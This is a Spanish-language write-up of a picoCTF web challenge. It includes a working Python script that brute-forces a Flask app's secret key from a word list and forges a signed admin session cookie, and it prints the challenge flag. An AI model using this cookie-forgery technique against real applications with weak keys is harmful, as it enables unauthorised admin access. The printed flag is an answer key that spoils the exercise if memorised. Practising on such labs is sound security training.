

## DESCRIPCION
- Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

Instance
## SOLUCION
- 1. Sacar la cookie session del sitio.
2. Brute-forcear el secret_key con la lista de nombres de galletas (está en el server.py).
3. Firmar una cookie con:
    
    ```
  from itsdangerous import URLSafeTimedSerializer, TimestampSigner
import hashlib

cookie = "COOKIE_DEL_SITIO"
cookie_names = [
    "snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap",
    "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses",
    "kiss", "biscotti", "butter", "spritz", "snowball", "drop",
    "thumbprint", "pinwheel", "wafer", "macaroon", "fortune",
    "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen",
    "macaron", "black and white", "white chocolate macadamia"
]

# Buscar secret key
for secret in cookie_names:
    try:
        s = URLSafeTimedSerializer(
            secret_key=secret,
            salt='cookie-session',
            signer=TimestampSigner,
            signer_kwargs={
                'key_derivation': 'hmac',
                'digest_method': hashlib.sha1
            }
        )
        print(f"[+] Secret encontrado: {secret}")
        print(s.loads(cookie))
        break
    except:
        continue

# Firmar cookie de admin
s = URLSafeTimedSerializer(
    secret_key=secret,
    salt='cookie-session',
    signer=TimestampSigner,
    signer_kwargs={
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
)
print(s.dumps({"very_auth": "admin"}))
    ```
    
4. Reemplazar la cookie y entrar a /display.

**Flag:** picoCTF{cO0ki3s_yum_485f560e}
## NOTAS ADICIONALES
-  El secret_key cambia cada vez que se reinicia la instancia, por lo que hay que volver a hacer el brute-force.
- La lista de posibles secretos está hardcodeada en el server.py del reto.
- Herramientas útiles: flask-unsign o el script anterior con itsdangerous.

## REFERENCIAS
Gemini IA